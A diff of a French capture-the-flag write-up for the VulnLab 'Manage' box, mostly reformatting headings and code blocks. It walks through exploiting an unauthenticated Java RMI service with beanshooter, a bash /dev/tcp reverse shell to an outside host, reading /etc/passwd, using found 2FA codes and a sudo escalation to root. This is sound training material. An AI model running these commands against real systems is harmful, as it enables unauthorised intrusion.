@@ -1,26 +1,26 @@
 ---
-title: Manage - Easy
-description: WU Manage - Easy
+title: Manage
+description: WU Manage
 categories: [Writeup]
 tags: [writeup]
 template: doc
+sidebar:
+  order: 4
+  badge:
+    text: 'easy'
+    variant: success
 ---
+
 import { Image } from 'astro:assets';
 import banner from '../../../../assets/writeup/vulnlab/banner.jpeg';
 
 <Image src={banner} alt="banner" format="avif" quality={"mid"}/>
 
-
-# MANAGE
-
-
 | OS | Difficulty | Target |
 |----|----|----|
 | Linux | <span style="color:green">**EASY**</span> | 10.10.100.194 |
 
-
-
-# 🔭 Enumeration
+## 🔭 Enumeration
 
 ```sh
 PORT     STATE SERVICE
@@ -86,7 +86,7 @@ Added to the queue: manager/
 
 Rien de particulier de trouver sur l'énumération du site.
 
-### Java-RMI
+## Java-RMI
 
 Le Port 2222 en cherchant sur internet, l'outil `beanshooter` semble intéressant. Je télécharge la [release]() puis j'exécute la commande suivante:
 
@@ -126,7 +126,7 @@ java -jar beanshooter-4.1.0-jar-with-dependencies.jar enum 10.10.100.194 2222
 [+] 			   Users:type=Role,rolename="role1",database=UserDatabase
 ```
 
-# 👣 Foothold
+## 👣 Foothold
 
 `beanshooter` nous permet de créer un payload et de l'exécuter puisque la sortie de la commande précédente nous indique que le "*Remote MBean server doesn't require authentication. Vulnerability Status: Vulnerable*"
 
@@ -142,6 +142,7 @@ java -jar beanshooter-4.1.0-jar-with-dependencies.jar standard 10.10.100.194 222
 [+] 	Caught NullPointerException while invoking the newTransformer action.
 [+] 	This is expected bahavior and the attack most likely worked :)
 ```
+
 Execution du payload et obtention d'un shell `Tomcat`:
 
 ```sh
@@ -162,7 +163,7 @@ java -jar beanshooter-4.1.0-jar-with-dependencies.jar standard 10.10.100.194 222
 tomcat
 ```
 
-```sh First Flag
+```sh title="First Flag"
 [tomcat@10.10.100.194 /opt]$ cd tomcat
 [tomcat@10.10.100.194 /opt/tomcat]$ ls
 bin
@@ -183,7 +184,8 @@ work
 [tomcat@10.10.100.194 /opt/tomcat]$ cat user.txt
 VL{<REDACTED>}
 ```
-```sh
+
+```sh wrap
 [tomcat@10.10.100.194 /opt/tomcat]$ cat /etc/passwd
 root:x:0:0:root:/root:/bin/bash
 [...]
@@ -193,15 +195,15 @@ tomcat:x:1001:1001::/opt/tomcat:/bin/false
 useradmin:x:1002:1002:,,,:/home/useradmin:/bin/bash
 ```
 
-#### Nouveau shell:
-
 Côté Hôte:
-```sh Host
+
+```sh
 nc -lvnp 4444
 ```
+
 Sur la Target:
 
-```sh Tomcat
+```sh
 bash -c 'bash -i >& /dev/tcp/10.8.3.147/4444 0>&1'
 ```
 
@@ -212,9 +214,10 @@ Password: o<REDACTED>d
 Verification code: o<REDACTED>d
 su: Authentication failure
 ```
+
 Une double authentification est configurée sur le compte, en tant que `tomcat` on peut fouiller les dossiers `/home` des users.
 
-```sh
+```sh wrap
 tomcat@manage:~$ cd /home
 cd /home
 tomcat@manage:/home$ ls
@@ -270,6 +273,7 @@ CLSSSMHYGLENX5HAIFBQ6L35UM
 69267218
 76839253
 56800775
+```
 
 ```sh
 tomcat@manage:/tmp$ su useradmin
@@ -280,7 +284,8 @@ Verification code: 99852083
 whoami
 useradmin
 ```
-# 🎯 Privilege Escalation
+
+## 🎯 Privilege Escalation
 
 Nous sommes désormais `useradmin` voyons quels sont ses privilèges:
 ```sh
@@ -327,7 +332,9 @@ Matching Defaults entries for admin on manage:
 User admin may run the following commands on manage:
     (ALL) ALL
 ```
+
 En ayant les pleins privilèges avec notre utilisateur tout juste créé, nous n'avons plus qu'à passer root pour obtenir le flag.
+
 ```sh
 sudo su
 cat /root/root.txt
